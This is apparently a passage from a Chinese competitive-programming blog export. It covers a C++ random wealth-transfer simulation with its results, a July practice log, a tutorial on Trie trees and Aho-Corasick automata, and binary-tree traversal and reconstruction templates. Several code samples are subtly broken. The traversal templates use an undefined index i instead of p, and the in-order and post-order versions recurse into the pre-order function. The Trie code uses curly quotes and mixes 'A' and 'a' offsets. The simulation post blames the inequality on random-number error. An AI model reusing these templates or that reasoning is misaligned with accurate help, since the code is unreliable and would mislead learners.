class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">200</span>],n,num,m,b[<span class="number">200</span>],sum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;a.out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n; m=n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">20</span>;i++) a[i]=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=rand()%<span class="number">20</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[This]) a[This]--;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            n++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> That=rand()%<span class="number">20</span>; a[That]++;</span><br><span class="line">        <span class="keyword">if</span>(++num==m/<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum++;</span><br><span class="line">            num=<span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Data &quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Sort &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>然后开始逐渐的扩大范围：</p>
<p>1.当进行分配10次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 97 99 99 99 100 100 100 100 100 100 100 100 100 100 100 101 101 101 101 102</p>
</blockquote>
<p>可以看到并没有什么过大的差距。</p>
<p>2.当进行分配100次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 95 96 97 97 98 98 98 99 100 100 100 101 101 101 102 103 103 103 103 105</p>
</blockquote>
<p>这组数据仍然看不出来有什么差距。</p>
<p>3.当进行分配1000次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 81 81 84 89 93 94 94 96 102 104 106 106 106 107 107 108 108 110 112 112</p>
</blockquote>
<p>这个时候已经有些大了</p>
<p>4.当进行分配10000次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 54 55 59 61 67 79 84 85 85 93 97 98 103 114 127 137 147 148 149 158</p>
</blockquote>
<p>这个时候已经是非常非常的明显了。</p>
<p>5.当进行分配100000次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 6 22 28 29 30 54 59 80 83 94 95 107 122 144 151 156 173 175 190 202</p>
</blockquote>
<p>这个时候贫富差距已经非常的可观了，然而继续。</p>
<p>6.当进行分配10000000次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 4 6 11 12 14 14 24 44 47 57 57 63 77 81 81 151 197 326 342 392</p>
</blockquote>
<p>继续扩大。</p>
<p>7.当进行分配100000000次的时候，最后贫富差距进行排序：</p>
<blockquote>
<p>Sort 1 11 15 22 36 40 46 46 58 69 76 90 96 124 132 195 211 225 233 274</p>
</blockquote>
<p>当实验进行到了这一步的时候，足够大的基数足以证明随着计算次数不断的增加，最后拿到钱的数目差距会越来越大。</p>
<h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><p>一个人的钱是从头到尾都是一直少或者一直多吗？由于采用的是随机数据，所以说应该不会是一直保持这样的。于是在中间的计算过程中，我们将每个数据曾经的最大值和最小值也一起计算出来（稍微修改一下代码）:</p>
<p>当知己进行分配100000000次的时候：</p>
<ul>
<li><p>Fanily 36 233 195 124 69 76 211 1 274 90 132 15 46 46 225 58 96 11 22 40</p>
</li>
<li><p>Max 429 762 508 706 587 687 576 594 682 661 707 568 744 676 532 523 802 480 702 762</p>
</li>
<li><p>Min 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</p>
</li>
</ul>
<p>由于最小值不好看出来，所以说就修改一下代码，允许有负债的情况。</p>
<ul>
<li><p>Final 2229 860 -572 -252 996 -1845 -4223 -125 -2361 -1549 -2366 1596 970 -2503 4414 1333 -1326 5568 3196 -2040</p>
</li>
<li><p>Max 4058 2265 1767 3389 3088 1275 1358 1106 561 2911 2748 4362 2909 606 4689 1967 1079 5978 3522 483</p>
</li>
<li><p>Min -812 -1925 -1893 -433 -1054 -2174 -4467 -3407 -4375 -2584 -2548 -665 -1232 -3983 -1269 -2084 -2403 -1087 -522 -3753</p>
</li>
</ul>
<p>越来越有意思了，虽然有一些曾经咸鱼，最大值却非常大的，但是可以看到，整体上是呈现线性排布的，也就是说，结果小的一般最小值就小，最大值就不大……</p>
<h2 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h2><p>我为了保证随机数的准确性，特意跑了一遍随机数，发现在大基数的条件下，每个数被选择到的概率是相等的，但是频率并不相等（好像是废话），数据如下（数据为这个数被选中的次数）：</p>
<p>Rand: 5001361 5004661 5005396 5000955 5001247 5002474 5001408 4998552 5001943 4995260 4998057 5001047 4999649 4996001 4997516 5000693 4996266 5002321 4998128 4999065</p>
<p>等等，好像问题件就是出现在了这里啊……这里表示的是选中这个当前这个人来扣掉他一块钱，然后分给其他人。那么在这个大的样本里面，选中的误差值大概在±9000以内。问题就是出在了±9000以内。</p>
<p>也就是说，计算机里的随机数选择的时候，在进行100000000选择的时候，误差值是在±9000以内。那么会不是正是因为这9000的误差值，导致的贫富差距呢？</p>
<p>毕竟我们看到，如果允许负债的话，和100的差值大约在±5000内。这是不是因为计算机随机数并不“随机”的原因导致的呢？所以说这个问题可能就是因为计算机的随机数的误差导致的贫富差距。因为误差比较小，所以只有在进行1000000000次选择的时候，所体现出来的误差的范围扩大到了±9000，那么贫富差距可能就是由于这些误差才显示出来的。</p>
<ul>
<li><p>其实这里导致误差看起来如此之大的原因其实很简单，虽然随机数的误差并不大，但是由于基数很小（20或者100），在每个人身上的误差就会累加起来，虽然制造成了大概一百元左右的误差，但是看起来却是非常大的。</p>
</li>
<li><p>如果我们将每个人有100元变成每个人有1000000000元，相信你看到的答案又不一样了。</p>
</li>
<li><p>emmmm 事实上出现这种情况我的看法是因为误差（方差）的积累加上基数很小的方法造成的。仅仅作为一个参考放在这里。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>感想</tag>
      </tags>
  </entry>
  <entry>
    <title>Jul刷题柱</title>
    <url>/2017/07/12/5ec1303806d6/</url>
    <content><![CDATA[<h1 id="刷题柱"><a href="#刷题柱" class="headerlink" title="刷题柱"></a>刷题柱</h1><p>Jul/1 被赶回去学文化课</p>
<p>Jul/2 被赶回去学文化课</p>
<p>Jul/3 被赶回去学文化课</p>
<p>Jul/4 被赶回去学文化课</p>
<p>Jul/5 被赶回去学文化课</p>
<p>Jul/6 被赶回去学文化课</p>
<p>Jul/7 被赶回去学文化课</p>
<p>Jul/8 考试</p>
<p>Jul/9 考试</p>
<p>Jul/10 放假</p>
<p>Jul/11 放假</p>
<p>Jul/12 听山神讲课</p>
<p>Jul/13 听闵神讲课</p>
<p>Jul/14 听山神讲课</p>
<p>Jul/15 听闵神讲课</p>
<p>Jul/16 听闵神讲课</p>
<p>Jul/17 听山神讲课</p>
<p>Jul/18 放假</p>
<p>Jul/19 NOI网上同步赛</p>
<p>Jul/20 NOI网上同步赛</p>
<p>由于各种不可抗拒因素，刷题柱暂封……</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>刷题柱</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Trie数的Aho-Corasick自动机</title>
    <url>/2017/06/05/eeb2fb796d98/</url>
    <content><![CDATA[<h1 id="说在前面："><a href="#说在前面：" class="headerlink" title="说在前面："></a>说在前面：</h1><blockquote>
<p>自从被刘老师赶出来机房了，没有办法好好在OJ上刷题，于是就借着各种闲杂课看看各种知识点吧，题目等到暑假的时候一定要刷个够。昨天老师基本没有讲什么课，所以就用来学习算法了。</p>
</blockquote>
<h1 id="Trie树"><a href="#Trie树" class="headerlink" title="Trie树"></a>Trie树</h1><h2 id="Trie树定义："><a href="#Trie树定义：" class="headerlink" title="Trie树定义："></a>Trie树定义：</h2><blockquote>
<p>Trie,又称单词查找树,是一种树形结构，用于保存大量的字符串。它的优点是：利用字符串的公共前缀来节约存储空间。</p>
</blockquote>
<h2 id="Trie树构建："><a href="#Trie树构建：" class="headerlink" title="Trie树构建："></a>Trie树构建：</h2><blockquote>
<p>Trie树拥有有3个基本性质：</p>
</blockquote>
<ol>
<li>根节点不包含字符，除根节点外每一个节点都只包含1个字符,每个节点都有26个分叉。</li>
<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>
<li>每个节点的所有子节点包含的字符都不相同。</li>
</ol>
<p>下面是个trie树的例子：</p>
<p><img src="https://xorex.space/image/058.jpg"></p>
<p>这里运用了非常巧妙的方法因为可能会出现各种字符重复，所以说这样就可以非常棒的进行存储，通过解决各种重复性的问题从而节约空间和查询的时间（效率是和字符串的重复度有关的）</p>
<p>在这个Trie结构中，保存了t、to、te、tea、ten、i、in、inn这8个字符串，仅占用8个字节</p>
<p>Trie树的每个节点下面应该有26[‘a’..’z’]个分支。当然，如果要区分大小写，就要多开了！一般都用指针来写，不过我们可以开个足够大的静态数组也可以。<br>基本26叉的数组，1万的容量基本是1M的存储空间。<br>按照竞赛的数据规模，我们用60万的静态数组完全足够了。</p>
<h2 id="Trie树代码："><a href="#Trie树代码：" class="headerlink" title="Trie树代码："></a>Trie树代码：</h2><h3 id="存储结构体"><a href="#存储结构体" class="headerlink" title="存储结构体"></a>存储结构体</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> endflag;</span><br><span class="line">    <span class="keyword">int</span> Link[<span class="number">26</span>];</span><br><span class="line">&#125;tree[<span class="number">610000</span>];</span><br></pre></td></tr></table></figure>
<h3 id="Trie树的建立"><a href="#Trie树的建立" class="headerlink" title="Trie树的建立"></a>Trie树的建立</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k,<span class="keyword">int</span> node)</span>  <span class="comment">//k是s的第k个字符，node为当前节点。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>  chindex=s[k]-‘A’;  <span class="comment">//字符的编号</span></span><br><span class="line">    <span class="keyword">if</span> (tree[node].link[chindex]==<span class="number">0</span>)   <span class="comment">//新开节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		tree[node].link[chindex]=++len;</span><br><span class="line">		tree[len].ch=s[k];</span><br><span class="line">		tree[len].endflag=<span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> nexnode=tree[node].link[chindex];  <span class="comment">//下一个节点的下标</span></span><br><span class="line">    <span class="keyword">if</span> (k==(<span class="keyword">int</span>)s.size()<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tree[nexnode].endflag=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    add(k+<span class="number">1</span>,nexnode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Trie树的查询"><a href="#Trie树的查询" class="headerlink" title="Trie树的查询"></a>Trie树的查询</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> last,<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"><span class="comment">//k是要查找字符串s的第k个元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> chindex=s[k]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree[node].link[chindex]==<span class="number">0</span>)  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> nextnode=tree[node].link[chindex];</span><br><span class="line">    <span class="keyword">if</span> (k==(s.size()<span class="number">-1</span>)) <span class="comment">//如果k是最后一个字符</span></span><br><span class="line">       <span class="keyword">if</span> (tree[nextnode].endflag)  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> find(k+<span class="number">1</span>,last,nextnode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Aho-Corasick自动机"><a href="#Aho-Corasick自动机" class="headerlink" title="Aho-Corasick自动机"></a>Aho-Corasick自动机</h1><p>我们先来看一道题：</p>
<blockquote>
<p>【P1366】给你N个单词(N &lt;= 10000) ，再给一篇文章（文章长度len&lt;=1000000 ）.<br>问有多少个单词在此文章中出现过。</p>
</blockquote>
<p>【分析】基本的kmp 的时间复杂度是 N*len。KMP算法，它是用于单个串的线性匹配算法 .强大的p数组让KMP的匹配到了O(N)级别。<br>trie树在乎的是公共前缀。</p>
<p>那么，能不能在 trie树上做kmp呢？Kmp上的p数组很强大，我们肯定要在trie树上的每个节点构造出自己的p数组。一般的文章都是在trie树上开一个 fail域，有时候叫 fail指针，失败指针。</p>
<p>这就是AC自动机算法的核心思想。</p>
<h2 id="AC自动机的原理："><a href="#AC自动机的原理：" class="headerlink" title="AC自动机的原理："></a>AC自动机的原理：</h2><p>Aho-Corasick自动机算法（简称AC自动机）1975年产生于贝尔实验室。该算法应用有限自动机巧妙地将字符比较转化为了状态转移。</p>
<p>AC自动机主要用于多关键字的字符串匹配。 要搞懂AC自动机，先得有模式树（字典树）Trie和KMP模式匹配算法的基础知识。</p>
<ul>
<li><p>如有模式串 { she, he, say, shr, her, ayd }<br>要对串 yshersayd 进行匹配 。<br>Kmp是对上面6个单词依次构造属于自己的P数组，依次枚举去验证。而AC自动机通过构造 失败指针 来 优化匹配，从而使算法复杂度达到 O(n)。</p>
</li>
<li><p>失败指针是在所有模式串或其前缀中找一个最大的那个 K，即对于串 S1，我们在其它模式串或其前缀中找一个串 S2，使得S1[len(S1)- k, len(S1)]= S2[0, k] 其中 k 最大，则 S1[ len(S1) ] 的失败指针为 S2[ len(s2) ]。</p>
</li>
<li><p>也可理解为当我们匹配失配时，利用已经匹配的结果，尽可能的将指针 i 往后移。</p>
</li>
<li><p>如下图，当我们用 ‘shersayd’ 匹配时，匹配到 ‘e’ 时以后的字符失配，这时我们不是用 ‘hersayd’ 继续从头开始匹配。利用匹配的结果，我们可以只用 ‘sayd’ 在红圈的另外那个 ‘e’ 开始匹配。失败指针就是在匹配失败时转移，使得能够继续匹配。</p>
</li>
</ul>
<p><img src="https://xorex.space/image/059.jpg"></p>
<ul>
<li>上图中，粗红线表示失败指针，没标明失败指针的结点的失败指针都指向根结点。构建了失败指针后，匹配是如果不能匹配就从失败指针走，再匹配。如我们匹配刚才 那个字符串  ’yshersayd’，首先是字母 ‘y’ ，没有匹配，走向失败指针根结点，然后字母 ‘s’，匹配，走 向 ‘s’。然后字母 ‘h’，匹配，走向 ‘h’。然后字母 ‘e’ 走向 ‘e’，得到模式串 ‘she’。然后 ‘r’ ，这时 ‘r’ 失配，我们走向 ‘e’ 的失配指针，粗红线指向的另一个 ‘e’，继续匹配，得到模式串 ‘her’。依次进行。可知，匹配过程就是在一个图中走动，图中某一个结点标记了匹配了某个模式串。</li>
</ul>
<h2 id="AC自动机的实现："><a href="#AC自动机的实现：" class="headerlink" title="AC自动机的实现："></a>AC自动机的实现：</h2><p>AC自动机的实现有如下几步：</p>
<ol>
<li> 定义trie树结构</li>
<li>   构造trie树</li>
<li>   计算每个节点的fail指针。</li>
<li>   Fail指针的构造就是在trie树上不停的往回找。其<strong>原理</strong>就是用bfs得到trie的层次图，(下面这句话是重点) <strong>当前节点的子节点的fail指针等于当前节点的fail指针的子节点</strong>。</li>
<li>   进行查询</li>
</ol>
<p>【细节】如果用c++的string。用cena评测发现大数据 c++的string的时间是 c语言 char 数组的4倍。<br>仔细体会下面的代码，然后自己一口气敲出来，就可以提交了。</p>
<p>AC自动机用一句话来定义就是在trie树上做kmp，fail域就是 kmp的p数组。这个是需要我们深刻理解的。</p>
<h2 id="AC自动机的代码："><a href="#AC自动机的代码：" class="headerlink" title="AC自动机的代码："></a>AC自动机的代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> endflag; <span class="comment">//是否是某个单词的最后一个字符.小心有多个重复的单词</span></span><br><span class="line">    <span class="keyword">int</span> fail;  <span class="comment">//失败指针</span></span><br><span class="line">    <span class="keyword">int</span> link[<span class="number">26</span>]; <span class="comment">//26个分叉</span></span><br><span class="line">&#125; tree[<span class="number">510100</span>];</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1001000</span>];  <span class="comment">//用字符数组代替字符串，在1000000 个字符条件下，速度会快一些。</span></span><br><span class="line"><span class="comment">//string s;</span></span><br><span class="line"><span class="keyword">int</span> n,m,len=<span class="number">0</span>,ans,slen;</span><br><span class="line"><span class="keyword">int</span> head,tail,root=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> q[<span class="number">510000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k,<span class="keyword">int</span> node)</span>  <span class="comment">//k是s的第k个字符，root为当前节点。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> chindex=s[k]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(tree[node].link[chindex]==<span class="number">0</span>)   <span class="comment">//新开节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        tree[node].link[chindex]=++len;</span><br><span class="line">        tree[len].endflag=<span class="number">0</span>; <span class="comment">//因为存在有多个相同的单词</span></span><br><span class="line">        tree[len].fail=root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> nexnode=tree[node].link[chindex];</span><br><span class="line">    <span class="keyword">if</span>(k==slen<span class="number">-1</span>)  <span class="comment">//恰好是一个单词的结尾。</span></span><br><span class="line">    &#123;</span><br><span class="line">        tree[nexnode].endflag++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    add(k+<span class="number">1</span>,nexnode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(tree,<span class="number">0</span>,<span class="keyword">sizeof</span>(tree));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">        slen=<span class="built_in">strlen</span>(s);  <span class="comment">//因为字符串比较多，用了c语言的字符串读入。</span></span><br><span class="line">        add(<span class="number">0</span>,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildac</span><span class="params">()</span><span class="comment">//生成fail指针，建好AC自动机</span></span></span><br><span class="line"><span class="function"><span class="comment">//用bfs生成一个层次序列，fail指针肯定往前跳。按层次依次求出fail指针</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head=tail=<span class="number">0</span>;</span><br><span class="line">    q[tail]=root;</span><br><span class="line">    <span class="keyword">while</span> (head&lt;=tail) <span class="comment">//bfs广度优先遍历 trie树</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> now=q[head++];<span class="comment">//  当前的节点</span></span><br><span class="line">        <span class="keyword">int</span> temp; <span class="comment">//用来存储临时的fail指针，是tree的下标</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(tree[now].link[i])  <span class="comment">//求link[i].fail指针</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nextnode=tree[now].link[i];</span><br><span class="line">            <span class="keyword">if</span>(now!=root)<span class="comment">//如果是根，那么fail肯定是root</span></span><br><span class="line">            &#123;</span><br><span class="line">                temp=tree[now].fail;</span><br><span class="line">                <span class="keyword">while</span>(!tree[temp].link[i] &amp;&amp; temp)<span class="comment">//找不到与 link[i]匹配的前缀  且没有退到根</span></span><br><span class="line">                temp=tree[temp].fail; <span class="comment">//继续向上退</span></span><br><span class="line">                tree[nextnode].fail=tree[temp].link[i];</span><br><span class="line">            &#125;</span><br><span class="line">            q[++tail]=nextnode;  <span class="comment">//让这个子节点进队。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now=root;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    len=<span class="built_in">strlen</span>(s);  <span class="comment">//这里用的也是c语言的字符。</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> chindex=s[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>( !tree[now].link[chindex] &amp;&amp; now!=root)<span class="comment">//如果找不到，往回返</span></span><br><span class="line">        now=tree[now].fail;</span><br><span class="line">        now=tree[now].link[chindex];<span class="comment">//下一层传递。</span></span><br><span class="line">        <span class="keyword">int</span> temp=now;<span class="comment">//如果找到某个单词</span></span><br><span class="line">        <span class="keyword">while</span>(temp!=root&amp;&amp; tree[temp].endflag&gt;<span class="number">-1</span> ) <span class="comment">//如果找到某个单词，累加到结果</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans+= tree[temp].endflag;</span><br><span class="line">            tree[temp].endflag=<span class="number">-1</span>;</span><br><span class="line">            temp=tree[temp].fail;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    buildac();</span><br><span class="line">    find();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>Trie树</tag>
        <tag>AC自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>树结构模板</title>
    <url>/2017/06/05/bcbc5f7ac04b/</url>
    <content><![CDATA[<h1 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h1><h2 id="前序遍历："><a href="#前序遍历：" class="headerlink" title="前序遍历："></a>前序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">First_traversal</span><span class="params">(<span class="keyword">int</span> p)</span><span class="comment">//前序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="中序遍历："><a href="#中序遍历：" class="headerlink" title="中序遍历："></a>中序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Second_traversal</span><span class="params">(<span class="keyword">int</span> p)</span><span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后序遍历："><a href="#后序遍历：" class="headerlink" title="后序遍历："></a>后序遍历：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Third_traversal</span><span class="params">(<span class="keyword">int</span> p)</span><span class="comment">//后序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    First_traversal(a[i].leftchild);</span><br><span class="line">    First_traversal(a[i].rightchild);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[i].now;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二叉树重建："><a href="#二叉树重建：" class="headerlink" title="二叉树重建："></a>二叉树重建：</h1><h2 id="中序和后序得出前序遍历"><a href="#中序和后序得出前序遍历" class="headerlink" title="中序和后序得出前序遍历"></a>中序和后序得出前序遍历</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tree_Second_to_Third</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span><span class="comment">//中序和后序得出前序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;b[lb];</span><br><span class="line">        Tree_Second_to_Third(i-la,la,lb-n-la+i);</span><br><span class="line">        Tree_Second_to_Third(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前序和中序得出后序遍历"><a href="#前序和中序得出后序遍历" class="headerlink" title="前序和中序得出后序遍历"></a>前序和中序得出后序遍历</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tree_First_to_Second</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span><span class="comment">//前序和中序得出后序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        Tree_First_to_Second(i-la,la,lb+<span class="number">1</span>);</span><br><span class="line">        Tree_First_to_Second(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb+i-la+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;b[lb];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
